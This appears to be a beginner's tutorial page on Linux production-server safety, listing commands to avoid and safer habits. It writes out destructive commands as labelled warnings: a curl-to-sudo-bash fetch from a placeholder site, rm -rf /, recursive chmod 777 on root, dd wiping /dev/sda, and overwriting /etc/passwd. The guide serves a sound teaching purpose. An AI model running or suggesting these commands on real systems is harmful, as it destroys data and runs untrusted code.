# The "Don't Do This" Guide

You've learned what to do on a production server. Now let's talk about what **not** to do.

These aren't hypothetical dangers. Every rule here exists because someone (often a very smart someone) made this mistake and caused an outage. Learn from their pain.

**Read this before you do anything with `sudo`.**

---

## The Cardinal Rules

### Rule 1: Don't Run Commands You Don't Understand

Someone in a forum says "just run this":

``` bash title="DO NOT RUN THIS"
curl -s http://sketchy-site.com/fix.sh | sudo bash
```

**Never do this.** You're downloading and executing unknown code with root privileges.

Even if the command looks harmless, understand what it does before running it:

- `rm` deletes things
- `>` overwrites files
- `chmod 777` makes everything writable by everyone
- `dd` can destroy disks

**When in doubt:** Ask someone. Look it up. Don't just run it.

---

### Rule 2: Don't Make Changes Without Understanding Impact

Before changing anything, ask:

1. **What does this change do?**
2. **What could go wrong?**
3. **How do I undo it?**
4. **Is anyone else affected?**

If you can't answer these questions, you're not ready to make the change.

---

### Rule 3: Test in Lower Environments First

The hierarchy of environments exists for a reason:

```
Development → Staging → Production
   (safe)      (safe)     (dangerous)
```

**Never** test changes in production if you have staging available.

---

## The Dangerous Commands

### rm - Delete With Extreme Prejudice

`rm` doesn't move files to trash. It destroys them. Forever.

``` bash title="DANGEROUS - DO NOT RUN"
rm -rf /                    # Deletes EVERYTHING
rm -rf /*                   # Also deletes EVERYTHING
rm -rf /home/*              # Deletes all user data
rm -rf ./*                  # Deletes everything in current directory
```

!!! danger "The -rf Flags"
    - `-r` = Recursive (delete directories and contents)
    - `-f` = Force (no confirmation prompts)

    Together, they delete everything without asking. One typo and you've lost data.

**Safer alternatives:**

``` bash title="Safer Deletion"
# Check what you're about to delete first
ls /path/to/delete

# Remove without -f so you get prompts
rm -ri /path/to/delete

# Use trash-cli if available
trash-put /path/to/delete
```

---

### chmod 777 - The Security Disaster

``` bash title="DANGEROUS - DO NOT RUN"
chmod 777 /var/www/app        # Anyone can read/write/execute
chmod -R 777 /                # Security nightmare
```

`777` means: owner, group, AND everyone else can read, write, and execute.

**What's wrong with this?**

- Any user on the system can modify your files
- Attackers who get minimal access can now modify everything
- Some applications refuse to run with 777 permissions (SSH keys, for example)

**What to do instead:**

``` bash title="Proper Permissions"
# Make file readable by owner and group
chmod 640 /path/to/file

# Make directory accessible
chmod 750 /path/to/directory

# If you're not sure, ask what permissions should be
ls -la /path/to/file
```

---

### Restarting Services in Production

``` bash title="THINK BEFORE RUNNING"
sudo systemctl restart nginx
sudo service mysql restart
sudo reboot
```

These commands cause **downtime**. Even "restart" has a brief interruption.

**Before restarting anything:**

1. Is this production?
2. What depends on this service?
3. Is there a maintenance window?
4. Have you told anyone?
5. Is there a rollback plan?

**Better approach:**

- Ask: "Is it okay to restart nginx on prod?"
- Check if there's an on-call procedure
- Schedule a maintenance window if needed
- Use `reload` instead of `restart` when possible (zero-downtime config reload)

``` bash title="Reload vs Restart"
sudo systemctl reload nginx  # Reloads config without dropping connections
sudo systemctl restart nginx # Full restart, connections dropped
```

---

### Writing to System Files

``` bash title="DANGEROUS - DO NOT RUN"
echo "something" > /etc/hosts
cat something > /etc/passwd
> /var/log/syslog  # Truncates the log file
```

The `>` operator **overwrites** files. The `>>` operator appends. One wrong character and you've destroyed a critical system file.

**Before writing to any file:**

1. Is this a system file?
2. Do you have a backup?
3. Are you using `>` or `>>`?
4. Have you tested this command?

**Safer approach:**

``` bash title="Safer File Editing"
# Make a backup first
sudo cp /etc/hosts /etc/hosts.backup

# Use an editor (you can see what you're changing)
sudo vim /etc/hosts

# Verify the change
cat /etc/hosts
```

---

### dd - The Disk Destroyer

`dd` is powerful and dangerous. It writes raw data to devices.

``` bash title="WILL DESTROY YOUR DISK"
sudo dd if=/dev/zero of=/dev/sda  # Wipes the primary disk
```

If you see `dd` in a command, be extremely careful about the `of=` target. A wrong target destroys data instantly with no confirmation.

---

## Things That Seem Safe But Aren't

### Editing Config Files Directly

``` bash title="RISKY"
sudo vim /etc/nginx/nginx.conf
```

This isn't dangerous by itself, but:

- One syntax error can break the service
- You might forget to reload the service
- You have no record of what changed

**Better approach:**

``` bash title="Safer Config Editing"
# Test the config before editing
sudo nginx -t

# Make a backup
sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup

# Edit
sudo vim /etc/nginx/nginx.conf

# Test again
sudo nginx -t

# Only reload if test passes
sudo systemctl reload nginx
```

### Running Scripts Without Reading Them

``` bash title="RISKY"
sudo ./fix-everything.sh
```

**Always read the script first:**

``` bash title="Check Script Contents"
cat ./fix-everything.sh
less ./fix-everything.sh
```

Look for `rm`, `dd`, `chmod`, service restarts, or anything you don't understand.

### Copying Commands from the Internet

That Stack Overflow answer might be:

- Outdated
- Written for a different Linux distribution
- Missing context
- Malicious (rare but possible)

**Always understand before running:**

- What does each part of the command do?
- Is this appropriate for your system?
- What's the worst that could happen?

---

## Production Safety Checklist

Before making any change in production:

| Check | Question |
|-------|----------|
| ✅ | Do I understand what this command does? |
| ✅ | Have I tested this in a lower environment? |
| ✅ | Do I have a rollback plan? |
| ✅ | Have I made a backup (if applicable)? |
| ✅ | Does anyone else need to know? |
| ✅ | Is there a change management process I should follow? |
| ✅ | Am I comfortable explaining this to my team lead? |

If any answer is "no", **stop and get help**.

---

## When Things Go Wrong

You made a mistake. Something broke. Now what?

### Don't Panic

Seriously. Panic leads to worse mistakes.

### Stop Making Changes

Don't try to "fix" it with more commands. You might make it worse.

### Document What Happened

What command did you run? What time? What server?

### Ask for Help

Tell your team immediately. The longer you wait, the worse it gets.

> "Hey, I ran [command] on [server] and [symptom]. I need help."

Much better than trying to fix it alone and making it worse.

### Learn from It

Every outage is a learning opportunity. Post-mortems exist to prevent repeats, not to assign blame.

---

## The Escape Hatches

### Ctrl+C - Stop Current Command

If a command is running and you want to stop it:

```
Ctrl+C
```

### Undo Recent File Edit

If you just edited a file and the service is broken:

``` bash title="Restore Backup"
sudo cp /etc/nginx/nginx.conf.backup /etc/nginx/nginx.conf
sudo systemctl reload nginx
```

### Check What Changed

``` bash title="Diff Against Backup"
diff /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup
```

---

## Quick Reference: Safe vs Dangerous

| Safe (Read-Only) | Dangerous (Modifies) |
|------------------|----------------------|
| `ls`, `cat`, `less` | `rm`, `mv`, `cp` |
| `grep`, `find` | `chmod`, `chown` |
| `ps`, `top` | `kill`, `pkill` |
| `systemctl status` | `systemctl restart/stop` |
| `df`, `du` | `dd`, `mkfs` |
| `git log`, `git status` | `git push`, `git reset` |

---

## The Golden Rules Summary

1. **Understand before you run** — Don't blindly execute commands
2. **Test in staging first** — Production is not for experiments
3. **Make backups** — Before changing any config file
4. **Ask if unsure** — It's okay not to know everything
5. **Communicate** — Tell people before and after changes
6. **Have a rollback plan** — Know how to undo
7. **Stay calm** — Panic makes mistakes worse

---

## You've Completed Day One!

Congratulations! You now know how to:

- ✅ Connect to a server via SSH
- ✅ Orient yourself on a new system
- ✅ Understand your permissions
- ✅ Explore safely
- ✅ Read logs like a pro
- ✅ Find documentation and help
- ✅ Perform common first tasks
- ✅ Avoid dangerous mistakes

**What's next?**

Ready to level up your command-line skills? Head to [Level 1: Everyday Navigation](../level_1/overview.md) to master the commands you'll use every single day.

!!! success "You're Going to Be Fine"
    Everyone who's comfortable on Linux servers started exactly where you are now. The fact that you read a safety guide before diving in shows good instincts. Keep asking questions, keep learning, and you'll be the one helping new people before you know it.
